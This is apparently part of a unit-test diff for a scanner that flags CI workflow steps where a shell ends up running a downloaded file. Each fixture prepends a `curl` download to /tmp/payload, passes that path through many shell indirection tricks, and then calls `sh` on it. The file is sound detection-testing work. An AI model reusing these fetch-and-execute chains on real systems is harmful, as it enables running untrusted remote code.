+        ('XB45', '11111111', 'echo : > cenv0; echo : > cf\nK=Z\nT=/dev/null\ng() { T=$X; }\nh0() { export "$K=v" X=/dev/null; }\nh1() { export "$K=v" X=@P@; }\nh0\ng\nh1\nT=/dev/null\ng\nsh "$T"'),
+        ('XB49', '11111111', 'echo : > cenv0; echo : > cf\nK=Z\nT=/dev/null\ng() { T=$X; }\nfor i in 1 2; do\nexport "$K=v" X=/dev/null\ng\ndone\nexport "$K=v" X=@P@\nT=/dev/null\ng\nsh "$T"'),
+        ('XC01', '11111111', 'echo : > cenv0; echo : > cf\nK=Z\nT=/dev/null\ng() { T=$X; }\nexport "$K=v" X=/dev/null\ng\nexport "$K=v" X=@P@\nT=/dev/null\nexport "$K=v"\ng\nsh "$T"'),
+        ('XC02', '11111111', 'echo : > cenv0; echo : > cf\nK=Z\nT=/dev/null\ng() { T=$X; }\nexport "$K=v" X=/dev/null\nunset T\ng\nexport "$K=v" X=@P@\nunset T\ng\nsh "$T"'),
+        ('XC03', '11111111', 'echo : > cenv0; echo : > cf\nK=Z\nT=/dev/null\ng() { T=$X; }\nexport "$K=v" X=/dev/null\nT=\ng\nexport "$K=v" X=@P@\nT=\ng\nsh "$T"'),
+        ('XC04', '11111100', 'echo : > cenv0; echo : > cf\nK=Z\nT=/dev/null\ng() { T=$X; }\ndeclare "$K=v" X=/dev/null\ng\ndeclare "$K=v" X=@P@\nT=/dev/null\nexport "$K=v"\ng\nsh "$T"'),
+        ('XC05', '11111100', 'echo : > cenv0; echo : > cf\nK=Z\nT=/dev/null\ng() { T=$X; }\ndeclare "$K=v" X=/dev/null\nunset T\ng\ndeclare "$K=v" X=@P@\nunset T\ng\nsh "$T"'),
+        ('XC06', '11111100', 'echo : > cenv0; echo : > cf\nK=Z\nT=/dev/null\ng() { T=$X; }\ndeclare "$K=v" X=/dev/null\nT=\ng\ndeclare "$K=v" X=@P@\nT=\ng\nsh "$T"'),
+        ('XC07', '11111100', 'echo : > cenv0; echo : > cf\nK=Z\nT=/dev/null\ng() { T=$X; }\ntypeset "$K=v" X=/dev/null\ng\ntypeset "$K=v" X=@P@\nT=/dev/null\nexport "$K=v"\ng\nsh "$T"'),
+        ('XC08', '11111100', 'echo : > cenv0; echo : > cf\nK=Z\nT=/dev/null\ng() { T=$X; }\ntypeset "$K=v" X=/dev/null\nunset T\ng\ntypeset "$K=v" X=@P@\nunset T\ng\nsh "$T"'),
+        ('XC09', '11111100', 'echo : > cenv0; echo : > cf\nK=Z\nT=/dev/null\ng() { T=$X; }\ntypeset "$K=v" X=/dev/null\nT=\ng\ntypeset "$K=v" X=@P@\nT=\ng\nsh "$T"'),
+        ('XC10', '11111111', 'echo : > cenv0; echo : > cf\nK=Z\nT=/dev/null\ng() { T=$X; }\nexport X=/dev/null "$K=v"\ng\nexport X=@P@ "$K=v"\nT=/dev/null\nexport "$K=v"\ng\nsh "$T"'),
+        ('XC11', '11111111', 'echo : > cenv0; echo : > cf\nK=Z\nT=/dev/null\ng() { T=$X; }\nexport X=/dev/null "$K=v"\nunset T\ng\nexport X=@P@ "$K=v"\nunset T\ng\nsh "$T"'),
+        ('XC12', '11111111', 'echo : > cenv0; echo : > cf\nK=Z\nT=/dev/null\ng() { T=$X; }\nexport X=/dev/null "$K=v"\nT=\ng\nexport X=@P@ "$K=v"\nT=\ng\nsh "$T"'),
+        ('XC25', '11100000', 'echo : > cenv0; echo : > cf\nK=Z\nT=/dev/null\ng() { T=$X; }\ndeclare -g "$K=v" X=/dev/null\ng\ndeclare -g "$K=v" X=@P@\nT=/dev/null\nexport "$K=v"\ng\nsh "$T"'),
+        ('XC26', '11100000', 'echo : > cenv0; echo : > cf\nK=Z\nT=/dev/null\ng() { T=$X; }\ndeclare -g "$K=v" X=/dev/null\nunset T\ng\ndeclare -g "$K=v" X=@P@\nunset T\ng\nsh "$T"'),
+        ('XC27', '11100000', 'echo : > cenv0; echo : > cf\nK=Z\nT=/dev/null\ng() { T=$X; }\ndeclare -g "$K=v" X=/dev/null\nT=\ng\ndeclare -g "$K=v" X=@P@\nT=\ng\nsh "$T"'),
+        ('XC28', '11111111', 'echo : > cenv0; echo : > cf\nK=Z\nT=/dev/null\ng() { T=$X; }\nexport "$K" X=/dev/null\ng\nexport "$K" X=@P@\nT=/dev/null\nexport "$K=v"\ng\nsh "$T"'),
+        ('XC29', '11111111', 'echo : > cenv0; echo : > cf\nK=Z\nT=/dev/null\ng() { T=$X; }\nexport "$K" X=/dev/null\nunset T\ng\nexport "$K" X=@P@\nunset T\ng\nsh "$T"'),
+        ('XC30', '11111111', 'echo : > cenv0; echo : > cf\nK=Z\nT=/dev/null\ng() { T=$X; }\nexport "$K" X=/dev/null\nT=\ng\nexport "$K" X=@P@\nT=\ng\nsh "$T"'),
+        ('XC38', '11111111', 'echo : > cenv0; echo : > cf\nK=Z\nT=/dev/null\ng() { T=$X; }\nexport "$K=v" X=/dev/null\nT=\ng\nexport "$K=v" X=@P@\nT=\nif :; then g; fi\nsh "$T"'),
+        ('XC39', '11111111', 'echo : > cenv0; echo : > cf\nK=Z\nT=/dev/null\ng() { T=$X; }\nh() { g; }\nexport "$K=v" X=/dev/null\nT=\nh\nexport "$K=v" X=@P@\nT=\nh\nsh "$T"'),
+    )
+    B2 = (
+        ('BB201', '11111111', 'echo T=@P@ > cenv\nT=/dev/null\ng() { . ./cenv; }\nfor i in 1 2; do\nX=a0; : "$X"\nX=a1; : "$X"\nX=a2; : "$X"\nX=a3; : "$X"\nX=a4; : "$X"\nX=a5; : "$X"\nX=a6; : "$X"\nX=a7; : "$X"\ng\ndone\nsh "$T"'),
+        ('BB203', '11111111', 'echo T=@P@ > cenv\nT=/dev/null\ng() { . ./cenv; }\nfor i in 1 2; do\nX=a0; : "$X"\nX=a1; : "$X"\nX=a2; : "$X"\nX=a3; : "$X"\nX=a4; : "$X"\nX=a5; : "$X"\nX=a6; : "$X"\nX=a7; : "$X"\nX=a8; : "$X"\ng\ndone\nsh "$T"'),
+        ('BB205', '11111111', 'echo T=@P@ > cenv\nT=/dev/null\ng() { . ./cenv; }\nfor i in 1 2; do\nX=a0; : "$X"\nX=a1; : "$X"\nX=a2; : "$X"\nX=a3; : "$X"\nX=a4; : "$X"\nX=a5; : "$X"\nX=a6; : "$X"\nX=a7; : "$X"\nX=a8; : "$X"\nX=a9; : "$X"\nX=a10; : "$X"\nX=a11; : "$X"\ng\ndone\nsh "$T"'),
+        ('BB207', '11111111', 'echo T=@P@ > cenv\nT=/dev/null\ng() { . ./cenv; }\nfor i in 1 2; do\nX=a0; : "$X"\nX=a1; : "$X"\nX=a2; : "$X"\nX=a3; : "$X"\nX=a4; : "$X"\nX=a5; : "$X"\nX=a6; : "$X"\nX=a7; : "$X"\nX=a8; : "$X"\nX=a9; : "$X"\nX=a10; : "$X"\nX=a11; : "$X"\nX=a12; : "$X"\nX=a13; : "$X"\nX=a14; : "$X"\nX=a15; : "$X"\nX=a16; : "$X"\nX=a17; : "$X"\nX=a18; : "$X"\nX=a19; : "$X"\nX=a20; : "$X"\nX=a21; : "$X"\nX=a22; : "$X"\nX=a23; : "$X"\nX=a24; : "$X"\nX=a25; : "$X"\nX=a26; : "$X"\nX=a27; : "$X"\nX=a28; : "$X"\nX=a29; : "$X"\ng\ndone\nsh "$T"'),
+        ('BB209', '11111111', 'echo T=@P@ > cenv\nT=/dev/null\ng() { : "$X"; . ./cenv; }\nfor i in 1 2; do\nX=a0; : "$X"\nX=a1; : "$X"\nX=a2; : "$X"\nX=a3; : "$X"\nX=a4; : "$X"\nX=a5; : "$X"\nX=a6; : "$X"\nX=a7; : "$X"\ng\ndone\nsh "$T"'),
+        ('BB211', '11111111', 'echo T=@P@ > cenv\nT=/dev/null\ng() { : "$X"; . ./cenv; }\nfor i in 1 2; do\nX=a0; : "$X"\nX=a1; : "$X"\nX=a2; : "$X"\nX=a3; : "$X"\nX=a4; : "$X"\nX=a5; : "$X"\nX=a6; : "$X"\nX=a7; : "$X"\nX=a8; : "$X"\ng\ndone\nsh "$T"'),
+        ('BB213', '11111111', 'echo T=@P@ > cenv\nT=/dev/null\ng() { : "$X"; . ./cenv; }\nfor i in 1 2; do\nX=a0; : "$X"\nX=a1; : "$X"\nX=a2; : "$X"\nX=a3; : "$X"\nX=a4; : "$X"\nX=a5; : "$X"\nX=a6; : "$X"\nX=a7; : "$X"\nX=a8; : "$X"\nX=a9; : "$X"\nX=a10; : "$X"\nX=a11; : "$X"\ng\ndone\nsh "$T"'),
+        ('BB215', '11111111', 'echo T=@P@ > cenv\nT=/dev/null\ng() { : "$X"; . ./cenv; }\nfor i in 1 2; do\nX=a0; : "$X"\nX=a1; : "$X"\nX=a2; : "$X"\nX=a3; : "$X"\nX=a4; : "$X"\nX=a5; : "$X"\nX=a6; : "$X"\nX=a7; : "$X"\nX=a8; : "$X"\nX=a9; : "$X"\nX=a10; : "$X"\nX=a11; : "$X"\nX=a12; : "$X"\nX=a13; : "$X"\nX=a14; : "$X"\nX=a15; : "$X"\nX=a16; : "$X"\nX=a17; : "$X"\nX=a18; : "$X"\nX=a19; : "$X"\nX=a20; : "$X"\nX=a21; : "$X"\nX=a22; : "$X"\nX=a23; : "$X"\nX=a24; : "$X"\nX=a25; : "$X"\nX=a26; : "$X"\nX=a27; : "$X"\nX=a28; : "$X"\nX=a29; : "$X"\ng\ndone\nsh "$T"'),
+        ('XA29', '11111111', 'echo T=@P@ > cenv; echo \'A=(x @P@)\' > aenv; echo T=@P@ > cf\necho @P@ > tf; N=T\nT=/dev/null\ng() { . ./cenv; }\nfor i in 1 2; do\nX=a0; : "$X"\nX=a1; : "$X"\nX=a2; : "$X"\nX=a3; : "$X"\nX=a4; : "$X"\nX=a5; : "$X"\nX=a6; : "$X"\nX=a7; : "$X"\nX=a8; : "$X"\ng\ndone\nsh "$T"'),
+        ('XA30', '11111111', 'echo T=@P@ > cenv; echo \'A=(x @P@)\' > aenv; echo T=@P@ > cf\necho @P@ > tf; N=T\nT=/dev/null\ng() { . ./cenv; }\nfor i in 1 2; do\nX=a0; : "$X"\nX=a1; : "$X"\nX=a2; : "$X"\nX=a3; : "$X"\nX=a4; : "$X"\nX=a5; : "$X"\nX=a6; : "$X"\nX=a7; : "$X"\nX=a8; : "$X"\ncase $i in *) g;; esac\ndone\nsh "$T"'),
+        ('XA31', '11111111', 'echo T=@P@ > cenv; echo \'A=(x @P@)\' > aenv; echo T=@P@ > cf\necho @P@ > tf; N=T\nT=/dev/null\ng() { . ./cenv; }\nfor i in 1 2; do\nX=a0; : "$X"\nX=a1; : "$X"\nX=a2; : "$X"\nX=a3; : "$X"\nX=a4; : "$X"\nX=a5; : "$X"\nX=a6; : "$X"\nX=a7; : "$X"\nX=a8; : "$X"\nX=a9; : "$X"\nX=a10; : "$X"\nX=a11; : "$X"\ng\ndone\nsh "$T"'),
+        ('XA32', '11111111', 'echo T=@P@ > cenv; echo \'A=(x @P@)\' > aenv; echo T=@P@ > cf\necho @P@ > tf; N=T\nT=/dev/null\ng() { . ./cenv; }\nfor i in 1 2; do\nX=a0; : "$X"\nX=a1; : "$X"\nX=a2; : "$X"\nX=a3; : "$X"\nX=a4; : "$X"\nX=a5; : "$X"\nX=a6; : "$X"\nX=a7; : "$X"\nX=a8; : "$X"\nX=a9; : "$X"\nX=a10; : "$X"\nX=a11; : "$X"\ncase $i in *) g;; esac\ndone\nsh "$T"'),
+        ('XA33', '11111111', 'echo T=@P@ > cenv; echo \'A=(x @P@)\' > aenv; echo T=@P@ > cf\necho @P@ > tf; N=T\nT=/dev/null\ng() { . ./cenv; }\nfor i in 1 2; do\nX=a0; : "$X"\nX=a1; : "$X"\nX=a2; : "$X"\nX=a3; : "$X"\nX=a4; : "$X"\nX=a5; : "$X"\nX=a6; : "$X"\nX=a7; : "$X"\nX=a8; : "$X"\ng\ng\ndone\nsh "$T"'),
+        ('XA37', '11111100', 'echo T=@P@ > cenv; echo \'A=(x @P@)\' > aenv; echo T=@P@ > cf\necho @P@ > tf; N=T\nT=/dev/null\ng() { source ./cenv; }\nfor i in 1 2; do\nX=a0; : "$X"\nX=a1; : "$X"\nX=a2; : "$X"\nX=a3; : "$X"\nX=a4; : "$X"\nX=a5; : "$X"\nX=a6; : "$X"\nX=a7; : "$X"\nX=a8; : "$X"\ng\ndone\nsh "$T"'),
+        ('XA38', '11111100', 'echo T=@P@ > cenv; echo \'A=(x @P@)\' > aenv; echo T=@P@ > cf\necho @P@ > tf; N=T\nT=/dev/null\ng() { source ./cenv; }\nfor i in 1 2; do\nX=a0; : "$X"\nX=a1; : "$X"\nX=a2; : "$X"\nX=a3; : "$X"\nX=a4; : "$X"\nX=a5; : "$X"\nX=a6; : "$X"\nX=a7; : "$X"\nX=a8; : "$X"\ncase $i in *) g;; esac\ndone\nsh "$T"'),
+        ('XA39', '11111100', 'echo T=@P@ > cenv; echo \'A=(x @P@)\' > aenv; echo T=@P@ > cf\necho @P@ > tf; N=T\nT=/dev/null\ng() { source ./cenv; }\nfor i in 1 2; do\nX=a0; : "$X"\nX=a1; : "$X"\nX=a2; : "$X"\nX=a3; : "$X"\nX=a4; : "$X"\nX=a5; : "$X"\nX=a6; : "$X"\nX=a7; : "$X"\nX=a8; : "$X"\nX=a9; : "$X"\nX=a10; : "$X"\nX=a11; : "$X"\ng\ndone\nsh "$T"'),
+        ('XA40', '11111100', 'echo T=@P@ > cenv; echo \'A=(x @P@)\' > aenv; echo T=@P@ > cf\necho @P@ > tf; N=T\nT=/dev/null\ng() { source ./cenv; }\nfor i in 1 2; do\nX=a0; : "$X"\nX=a1; : "$X"\nX=a2; : "$X"\nX=a3; : "$X"\nX=a4; : "$X"\nX=a5; : "$X"\nX=a6; : "$X"\nX=a7; : "$X"\nX=a8; : "$X"\nX=a9; : "$X"\nX=a10; : "$X"\nX=a11; : "$X"\ncase $i in *) g;; esac\ndone\nsh "$T"'),
+        ('XA41', '11111100', 'echo T=@P@ > cenv; echo \'A=(x @P@)\' > aenv; echo T=@P@ > cf\necho @P@ > tf; N=T\nT=/dev/null\ng() { source ./cenv; }\nfor i in 1 2; do\nX=a0; : "$X"\nX=a1; : "$X"\nX=a2; : "$X"\nX=a3; : "$X"\nX=a4; : "$X"\nX=a5; : "$X"\nX=a6; : "$X"\nX=a7; : "$X"\nX=a8; : "$X"\ng\ng\ndone\nsh "$T"'),
+        ('XA53', '11111111', 'echo T=@P@ > cenv; echo \'A=(x @P@)\' > aenv; echo T=@P@ > cf\necho @P@ > tf; N=T\nT=/dev/null\ng() { read -r "$N" < tf; }\nfor i in 1 2; do\nX=a0; : "$X"\nX=a1; : "$X"\nX=a2; : "$X"\nX=a3; : "$X"\nX=a4; : "$X"\nX=a5; : "$X"\nX=a6; : "$X"\nX=a7; : "$X"\nX=a8; : "$X"\ng\ndone\nsh "$T"'),
+        ('XA54', '11111111', 'echo T=@P@ > cenv; echo \'A=(x @P@)\' > aenv; echo T=@P@ > cf\necho @P@ > tf; N=T\nT=/dev/null\ng() { read -r "$N" < tf; }\nfor i in 1 2; do\nX=a0; : "$X"\nX=a1; : "$X"\nX=a2; : "$X"\nX=a3; : "$X"\nX=a4; : "$X"\nX=a5; : "$X"\nX=a6; : "$X"\nX=a7; : "$X"\nX=a8; : "$X"\ncase $i in *) g;; esac\ndone\nsh "$T"'),
+        ('XA55', '11111111', 'echo T=@P@ > cenv; echo \'A=(x @P@)\' > aenv; echo T=@P@ > cf\necho @P@ > tf; N=T\nT=/dev/null\ng() { read -r "$N" < tf; }\nfor i in 1 2; do\nX=a0; : "$X"\nX=a1; : "$X"\nX=a2; : "$X"\nX=a3; : "$X"\nX=a4; : "$X"\nX=a5; : "$X"\nX=a6; : "$X"\nX=a7; : "$X"\nX=a8; : "$X"\nX=a9; : "$X"\nX=a10; : "$X"\nX=a11; : "$X"\ng\ndone\nsh "$T"'),
+        ('XA56', '11111111', 'echo T=@P@ > cenv; echo \'A=(x @P@)\' > aenv; echo T=@P@ > cf\necho @P@ > tf; N=T\nT=/dev/null\ng() { read -r "$N" < tf; }\nfor i in 1 2; do\nX=a0; : "$X"\nX=a1; : "$X"\nX=a2; : "$X"\nX=a3; : "$X"\nX=a4; : "$X"\nX=a5; : "$X"\nX=a6; : "$X"\nX=a7; : "$X"\nX=a8; : "$X"\nX=a9; : "$X"\nX=a10; : "$X"\nX=a11; : "$X"\ncase $i in *) g;; esac\ndone\nsh "$T"'),
+        ('XA57', '11111111', 'echo T=@P@ > cenv; echo \'A=(x @P@)\' > aenv; echo T=@P@ > cf\necho @P@ > tf; N=T\nT=/dev/null\ng() { read -r "$N" < tf; }\nfor i in 1 2; do\nX=a0; : "$X"\nX=a1; : "$X"\nX=a2; : "$X"\nX=a3; : "$X"\nX=a4; : "$X"\nX=a5; : "$X"\nX=a6; : "$X"\nX=a7; : "$X"\nX=a8; : "$X"\ng\ng\ndone\nsh "$T"'),
+        ('XA61', '11111100', 'echo T=@P@ > cenv; echo \'A=(x @P@)\' > aenv; echo T=@P@ > cf\necho @P@ > tf; N=T\nT=/dev/null\ng() { printf -v "$N" %s @P@; }\nfor i in 1 2; do\nX=a0; : "$X"\nX=a1; : "$X"\nX=a2; : "$X"\nX=a3; : "$X"\nX=a4; : "$X"\nX=a5; : "$X"\nX=a6; : "$X"\nX=a7; : "$X"\nX=a8; : "$X"\ng\ndone\nsh "$T"'),
+        ('XA62', '11111100', 'echo T=@P@ > cenv; echo \'A=(x @P@)\' > aenv; echo T=@P@ > cf\necho @P@ > tf; N=T\nT=/dev/null\ng() { printf -v "$N" %s @P@; }\nfor i in 1 2; do\nX=a0; : "$X"\nX=a1; : "$X"\nX=a2; : "$X"\nX=a3; : "$X"\nX=a4; : "$X"\nX=a5; : "$X"\nX=a6; : "$X"\nX=a7; : "$X"\nX=a8; : "$X"\ncase $i in *) g;; esac\ndone\nsh "$T"'),
+        ('XA63', '11111100', 'echo T=@P@ > cenv; echo \'A=(x @P@)\' > aenv; echo T=@P@ > cf\necho @P@ > tf; N=T\nT=/dev/null\ng() { printf -v "$N" %s @P@; }\nfor i in 1 2; do\nX=a0; : "$X"\nX=a1; : "$X"\nX=a2; : "$X"\nX=a3; : "$X"\nX=a4; : "$X"\nX=a5; : "$X"\nX=a6; : "$X"\nX=a7; : "$X"\nX=a8; : "$X"\nX=a9; : "$X"\nX=a10; : "$X"\nX=a11; : "$X"\ng\ndone\nsh "$T"'),
+        ('XA64', '11111100', 'echo T=@P@ > cenv; echo \'A=(x @P@)\' > aenv; echo T=@P@ > cf\necho @P@ > tf; N=T\nT=/dev/null\ng() { printf -v "$N" %s @P@; }\nfor i in 1 2; do\nX=a0; : "$X"\nX=a1; : "$X"\nX=a2; : "$X"\nX=a3; : "$X"\nX=a4; : "$X"\nX=a5; : "$X"\nX=a6; : "$X"\nX=a7; : "$X"\nX=a8; : "$X"\nX=a9; : "$X"\nX=a10; : "$X"\nX=a11; : "$X"\ncase $i in *) g;; esac\ndone\nsh "$T"'),
+        ('XA65', '11111100', 'echo T=@P@ > cenv; echo \'A=(x @P@)\' > aenv; echo T=@P@ > cf\necho @P@ > tf; N=T\nT=/dev/null\ng() { printf -v "$N" %s @P@; }\nfor i in 1 2; do\nX=a0; : "$X"\nX=a1; : "$X"\nX=a2; : "$X"\nX=a3; : "$X"\nX=a4; : "$X"\nX=a5; : "$X"\nX=a6; : "$X"\nX=a7; : "$X"\nX=a8; : "$X"\ng\ng\ndone\nsh "$T"'),
+        ('XA69', '11111111', 'echo T=@P@ > cenv; echo \'A=(x @P@)\' > aenv; echo T=@P@ > cf\necho @P@ > tf; N=T\nT=/dev/null\ng() { export "$N=@P@"; }\nfor i in 1 2; do\nX=a0; : "$X"\nX=a1; : "$X"\nX=a2; : "$X"\nX=a3; : "$X"\nX=a4; : "$X"\nX=a5; : "$X"\nX=a6; : "$X"\nX=a7; : "$X"\nX=a8; : "$X"\ng\ndone\nsh "$T"'),
+        ('XA70', '11111111', 'echo T=@P@ > cenv; echo \'A=(x @P@)\' > aenv; echo T=@P@ > cf\necho @P@ > tf; N=T\nT=/dev/null\ng() { export "$N=@P@"; }\nfor i in 1 2; do\nX=a0; : "$X"\nX=a1; : "$X"\nX=a2; : "$X"\nX=a3; : "$X"\nX=a4; : "$X"\nX=a5; : "$X"\nX=a6; : "$X"\nX=a7; : "$X"\nX=a8; : "$X"\ncase $i in *) g;; esac\ndone\nsh "$T"'),
+        ('XA71', '11111111', 'echo T=@P@ > cenv; echo \'A=(x @P@)\' > aenv; echo T=@P@ > cf\necho @P@ > tf; N=T\nT=/dev/null\ng() { export "$N=@P@"; }\nfor i in 1 2; do\nX=a0; : "$X"\nX=a1; : "$X"\nX=a2; : "$X"\nX=a3; : "$X"\nX=a4; : "$X"\nX=a5; : "$X"\nX=a6; : "$X"\nX=a7; : "$X"\nX=a8; : "$X"\nX=a9; : "$X"\nX=a10; : "$X"\nX=a11; : "$X"\ng\ndone\nsh "$T"'),
+        ('XA72', '11111111', 'echo T=@P@ > cenv; echo \'A=(x @P@)\' > aenv; echo T=@P@ > cf\necho @P@ > tf; N=T\nT=/dev/null\ng() { export "$N=@P@"; }\nfor i in 1 2; do\nX=a0; : "$X"\nX=a1; : "$X"\nX=a2; : "$X"\nX=a3; : "$X"\nX=a4; : "$X"\nX=a5; : "$X"\nX=a6; : "$X"\nX=a7; : "$X"\nX=a8; : "$X"\nX=a9; : "$X"\nX=a10; : "$X"\nX=a11; : "$X"\ncase $i in *) g;; esac\ndone\nsh "$T"'),
+        ('XA73', '11111111', 'echo T=@P@ > cenv; echo \'A=(x @P@)\' > aenv; echo T=@P@ > cf\necho @P@ > tf; N=T\nT=/dev/null\ng() { export "$N=@P@"; }\nfor i in 1 2; do\nX=a0; : "$X"\nX=a1; : "$X"\nX=a2; : "$X"\nX=a3; : "$X"\nX=a4; : "$X"\nX=a5; : "$X"\nX=a6; : "$X"\nX=a7; : "$X"\nX=a8; : "$X"\ng\ng\ndone\nsh "$T"'),
+        ('XA78', '11111100', 'echo T=@P@ > cenv; echo \'A=(x @P@)\' > aenv; echo T=@P@ > cf\necho @P@ > tf; N=T\nT=/dev/null\ng() { . ./aenv; }\nfor i in 1 2; do\nX=a0; : "$X"\nX=a1; : "$X"\nX=a2; : "$X"\nX=a3; : "$X"\nX=a4; : "$X"\nX=a5; : "$X"\nX=a6; : "$X"\nX=a7; : "$X"\nX=a8; : "$X"\ncase $i in *) g;; esac\ndone\nsh "${A[1]}"'),
+        ('XA80', '11111100', 'echo T=@P@ > cenv; echo \'A=(x @P@)\' > aenv; echo T=@P@ > cf\necho @P@ > tf; N=T\nT=/dev/null\ng() { . ./aenv; }\nfor i in 1 2; do\nX=a0; : "$X"\nX=a1; : "$X"\nX=a2; : "$X"\nX=a3; : "$X"\nX=a4; : "$X"\nX=a5; : "$X"\nX=a6; : "$X"\nX=a7; : "$X"\nX=a8; : "$X"\nX=a9; : "$X"\nX=a10; : "$X"\nX=a11; : "$X"\ncase $i in *) g;; esac\ndone\nsh "${A[1]}"'),
+        ('XA85', '11111111', 'echo T=@P@ > cenv; echo \'A=(x @P@)\' > aenv; echo T=@P@ > cf\necho @P@ > tf; N=T\nT=/dev/null\ng() { : "$X"; . ./cenv; }\nfor i in 1 2; do\nX=a0; : "$X"\nX=a1; : "$X"\nX=a2; : "$X"\nX=a3; : "$X"\nX=a4; : "$X"\nX=a5; : "$X"\nX=a6; : "$X"\nX=a7; : "$X"\nX=a8; : "$X"\ng\ndone\nsh "$T"'),
+        ('XA86', '11111111', 'echo T=@P@ > cenv; echo \'A=(x @P@)\' > aenv; echo T=@P@ > cf\necho @P@ > tf; N=T\nT=/dev/null\ng() { : "$X"; . ./cenv; }\nfor i in 1 2; do\nX=a0; : "$X"\nX=a1; : "$X"\nX=a2; : "$X"\nX=a3; : "$X"\nX=a4; : "$X"\nX=a5; : "$X"\nX=a6; : "$X"\nX=a7; : "$X"\nX=a8; : "$X"\ncase $i in *) g;; esac\ndone\nsh "$T"'),
+        ('XA87', '11111111', 'echo T=@P@ > cenv; echo \'A=(x @P@)\' > aenv; echo T=@P@ > cf\necho @P@ > tf; N=T\nT=/dev/null\ng() { : "$X"; . ./cenv; }\nfor i in 1 2; do\nX=a0; : "$X"\nX=a1; : "$X"\nX=a2; : "$X"\nX=a3; : "$X"\nX=a4; : "$X"\nX=a5; : "$X"\nX=a6; : "$X"\nX=a7; : "$X"\nX=a8; : "$X"\nX=a9; : "$X"\nX=a10; : "$X"\nX=a11; : "$X"\ng\ndone\nsh "$T"'),
+        ('XA88', '11111111', 'echo T=@P@ > cenv; echo \'A=(x @P@)\' > aenv; echo T=@P@ > cf\necho @P@ > tf; N=T\nT=/dev/null\ng() { : "$X"; . ./cenv; }\nfor i in 1 2; do\nX=a0; : "$X"\nX=a1; : "$X"\nX=a2; : "$X"\nX=a3; : "$X"\nX=a4; : "$X"\nX=a5; : "$X"\nX=a6; : "$X"\nX=a7; : "$X"\nX=a8; : "$X"\nX=a9; : "$X"\nX=a10; : "$X"\nX=a11; : "$X"\ncase $i in *) g;; esac\ndone\nsh "$T"'),
+        ('XA89', '11111111', 'echo T=@P@ > cenv; echo \'A=(x @P@)\' > aenv; echo T=@P@ > cf\necho @P@ > tf; N=T\nT=/dev/null\ng() { : "$X"; . ./cenv; }\nfor i in 1 2; do\nX=a0; : "$X"\nX=a1; : "$X"\nX=a2; : "$X"\nX=a3; : "$X"\nX=a4; : "$X"\nX=a5; : "$X"\nX=a6; : "$X"\nX=a7; : "$X"\nX=a8; : "$X"\ng\ng\ndone\nsh "$T"'),
+    )
+    REBUILT = (
+        ('MP07', '00000000', 'T=/dev/null\ng() { . /dev/null; }\nfor i in 1 2; do\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\ndone\nsh "$T"'),
+        ('MP08', '00000000', 'T=/dev/null\ng() { eval :; }\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
+        ('MP09', '00000000', 'T=/dev/null\ng() { eval :; }\nfor i in 1 2; do\ng\necho "$T"\necho "$T"\necho "$T"\necho "$T"\necho "$T"\necho "$T"\necho "$T"\necho "$T"\necho "$T"\necho "$T"\necho "$T"\necho "$T"\ndone\nsh "$T"'),
+        ('MV01', '00000000', 'T=/dev/null\ng() { eval :; T=/dev/null; }\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
+        ('MV02', '00000000', 'T=/dev/null\ng() { . /dev/null; T=/dev/null; }\nfor i in 1 2; do\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\ndone\nsh "$T"'),
+        ('MV06', '00000000', 'T=/dev/null\ng() { eval :; T=/dev/null; }\nf() { g; }\nf\nf\nf\nf\nf\nf\nf\nf\nf\nf\nsh "$T"'),
+    )
+    # Each truth's parents, by the `shell:` the guard reads (the round-10 seat's order).
+    PARENTS = ((None, (0, 3)), ("bash", (1, 4)), ("sh", (6,)), ("bash {0}", (2, 5)), ("sh {0}", (7,)))
+
+    @staticmethod
+    def seat(row):
+        return ("curl -fsSLo /tmp/payload %spayload\n" % URL + row.replace("@PD@", "/tmp")
+                .replace("@PN@", "payload").replace("@P@", "/tmp/payload") + "\n")
+
+    def test_each_reports_where_a_shell_runs_the_payload(self):
+        for rows in (self.B1, self.B2):
+            for name, truth, row in rows:
+                for shell, parents in self.PARENTS:
+                    if any(truth[p] == "1" for p in parents):
+                        with self.subTest(row=name, shell=shell):
+                            self.assertTrue(reported(self.seat(row), shell))
+
+    def test_a_site_rebuilt_past_the_budget_is_its_price(self):
+        for name, truth, row in self.REBUILT:
+            self.assertEqual("00000000", truth)
+            for shell in SHELLS:
+                with self.subTest(row=name, shell=shell):
+                    self.assertTrue(reported(self.seat(row), shell))
+
+
+class TestTheRoundElevenSeatsRows(unittest.TestCase):
+    """PR #2855 round 12, the round-11 verdict's B1, on its seat's rows as it filled them (`seat`: the
+    download to `@P@`, truth over eight parents). Past the budget a visit stands in only what changed
+    since the last one (`workflow_called._Step.since`), and a `read`, `unset` or `local` behind a
+    wrapper (`command`, `command -p`, `nohup`, `nice`, `env`, `timeout`, `stdbuf`, `setsid`, `flock`,
+    `xargs`) was no change to it, though the walk's `_cleared` reads such a write through
+    `shell_command.command` and takes the stand-in away: the use read the step's own clean value.
+    `set_at` names what such a write names (names only: main's reading of a wrapped `unset` as one,
+    #2909, is not copied).
+    - `GATE` (sets 64, 65 and 67: a named, an array and an any-name body, function-body walks, a site
+      between, every wrapper): 195 cells where a parent runs the payload, which round 11 read CLEAN.
+    - `SHARED` (SW81-SW94, SX32, SX38): a body that may set any name beside a wrapped `read`, 78 cells
+      every earlier tree read CLEAN where a parent runs the payload (#2910's).
+    Each row reports under every setting: where no parent runs the payload -- the `-e` settings, where
+    the failing wrapper stops the step (the WR rows), and `sh`, which has no arrays (SX29, SX31, SX32)
+    -- that is the price, 72 cells."""
+
+    GATE = (
+        ('SW25', '11111111', '@G@\necho /dev/null > rf\nT=/dev/null\ng() { T=@P@; }\ng\ncommand unset T\ng\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\n: "$T"\nsh "$T"'),
